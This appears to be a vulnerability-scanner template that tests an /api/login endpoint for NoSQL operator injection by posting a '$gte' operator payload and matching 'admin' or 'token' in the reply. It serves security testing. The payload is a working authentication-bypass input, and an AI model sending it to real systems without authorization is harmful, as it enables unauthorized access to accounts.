id: nosql2-024
name: 'NoSQL $gte in login'
severity: high
type: active
tags:
  - nosql
  - injection
  - api
description: 'NoSQL operator $gte accepted on /api/login'
requests:
  - method: POST
    path: '{{BaseURL}}/api/login'
    body: '{"login":{"$gte":""},"extra":"x"}'
    matchers:
      - type: word
        part: body
        words:
          - 'admin'
          - 'token'
